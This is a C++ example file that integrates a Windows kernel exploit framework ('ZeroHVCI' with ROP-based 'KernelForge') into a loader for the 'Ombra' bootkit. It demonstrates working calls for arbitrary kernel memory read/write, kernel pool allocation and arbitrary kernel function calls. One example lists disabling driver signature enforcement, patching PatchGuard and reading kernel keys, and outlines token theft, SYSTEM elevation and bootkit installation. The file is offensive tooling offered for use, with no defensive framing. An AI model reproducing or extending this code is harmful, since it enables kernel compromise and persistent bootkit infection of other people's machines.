// Example integration of ZeroHVCI into OmbraLoader
// This file demonstrates how to use the ported exploit framework

#include "zerohvci.h"
#include "kforge.h"
#include <Windows.h>
#include <cstdio>

namespace OmbraLoader {

// Example 1: Basic kernel memory read/write
bool ExampleBasicMemoryAccess()
{
    printf("\n[Example 1] Basic Kernel Memory Access\n");
    printf("========================================\n");

    // Initialize ZeroHVCI
    if (!zerohvci::Initialize()) {
        printf("[-] Failed to initialize ZeroHVCI\n");
        return false;
    }

    // Get current KTHREAD address
    ULONG64 kthread = zerohvci::GetCurrentKThread();
    printf("[+] Current KTHREAD: 0x%llx\n", kthread);

    // Read first 8 bytes of KTHREAD
    ULONG64 value = 0;
    if (zerohvci::ReadKernelMemoryEx((void*)kthread, &value, sizeof(value))) {
        printf("[+] KTHREAD[0]: 0x%llx\n", value);
    } else {
        printf("[-] Read failed\n");
    }

    return true;
}

// Example 2: Allocate kernel pool memory
bool ExampleKernelPoolAllocation()
{
    printf("\n[Example 2] Kernel Pool Allocation\n");
    printf("====================================\n");

    if (!zerohvci::IsInitialized()) {
        printf("[-] ZeroHVCI not initialized\n");
        return false;
    }

    // Allocate 4KB of NonPagedPoolNx
    void* pool = zerohvci::AllocateKernelPool(0x1000);
    if (!pool) {
        printf("[-] Pool allocation failed\n");
        return false;
    }

    printf("[+] Allocated kernel pool at: %p\n", pool);

    // Write pattern to pool
    ULONG64 pattern = 0xDEADBEEFCAFEBABE;
    if (zerohvci::WriteKernelMemoryEx(pool, &pattern, sizeof(pattern))) {
        printf("[+] Wrote pattern to pool\n");

        // Read it back
        ULONG64 readBack = 0;
        if (zerohvci::ReadKernelMemoryEx(pool, &readBack, sizeof(readBack))) {
            printf("[+] Read back: 0x%llx\n", readBack);
            if (readBack == pattern) {
                printf("[+] Pool R/W verification successful\n");
            }
        }
    }

    return true;
}

// Example 3: Call arbitrary kernel functions via KernelForge
bool ExampleKernelFunctionCall()
{
    printf("\n[Example 3] Kernel Function Calls via ROP\n");
    printf("===========================================\n");

    if (!zerohvci::IsInitialized()) {
        printf("[-] ZeroHVCI not initialized\n");
        return false;
    }

    // Call ExAllocatePool directly via ROP
    PVOID pool = zerohvci::kforge::ExAllocatePool(NonPagedPoolNx, 0x2000);
    if (pool) {
        printf("[+] ExAllocatePool returned: %p\n", pool);
    }

    // Example: Call PsGetCurrentProcess (returns EPROCESS)
    // Note: This requires the function to be exported by ntoskrnl.exe
    PVOID eprocess = zerohvci::kforge::CallKernelFunctionViaName<PVOID>("PsGetCurrentProcess");
    if (eprocess) {
        printf("[+] PsGetCurrentProcess returned: %p\n", eprocess);
    }

    return true;
}

// Example 4: Integration with Ombra bootkit installation
bool ExampleOmbraBootkitIntegration()
{
    printf("\n[Example 4] Ombra Bootkit Integration\n");
    printf("=======================================\n");

    if (!zerohvci::Initialize()) {
        printf("[-] ZeroHVCI initialization failed\n");
        return false;
    }

    // Scenario: Use kernel R/W to disable PatchGuard checks before bootkit install
    // This is a conceptual example - actual implementation would be more complex

    printf("[+] Kernel R/W primitives available\n");
    printf("[+] Could be used for:\n");
    printf("    - Disabling DSE (Driver Signature Enforcement)\n");
    printf("    - Patching PatchGuard callbacks\n");
    printf("    - Modifying boot configuration\n");
    printf("    - Reading kernel cryptographic keys\n");

    // Get current process EPROCESS
    ULONG64 eprocess = zerohvci::GetCurrentEProcess();
    printf("[+] Current EPROCESS: 0x%llx\n", eprocess);

    // In a real scenario, you would:
    // 1. Read EPROCESS->Token
    // 2. Elevate privileges to SYSTEM
    // 3. Disable security features
    // 4. Install Ombra bootkit via PhyMem driver mapper

    return true;
}

// Example 5: Cleanup and safe termination
void ExampleCleanup()
{
    printf("\n[Example 5] Cleanup\n");
    printf("====================\n");

    if (zerohvci::IsInitialized()) {
        printf("[*] Cleaning up ZeroHVCI...\n");
        zerohvci::Cleanup();
        printf("[+] Cleanup complete\n");
    }

    printf("\n[!] NOTE: Process should terminate after using ZeroHVCI\n");
    printf("[!]       Kernel stack has been corrupted during ROP operations\n");
}

// Main integration entry point
int RunZeroHVCIExamples()
{
    printf("\n");
    printf("========================================\n");
    printf("  ZeroHVCI Integration Examples        \n");
    printf("  Ombra Hypervisor V3                  \n");
    printf("========================================\n");

    // Check if running as Administrator
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isAdmin) {
        printf("[-] Administrator privileges required!\n");
        printf("[-] Please run as Administrator and try again.\n");
        return -1;
    }

    printf("[+] Running with Administrator privileges\n");

    // Run examples
    ExampleBasicMemoryAccess();
    ExampleKernelPoolAllocation();
    ExampleKernelFunctionCall();
    ExampleOmbraBootkitIntegration();
    ExampleCleanup();

    printf("\n[*] All examples completed\n");
    printf("[!] Terminating process (kernel stack corrupted)\n");

    return 0;
}

} // namespace OmbraLoader

// Uncomment to test standalone
/*
int main()
{
    return OmbraLoader::RunZeroHVCIExamples();
}
*/
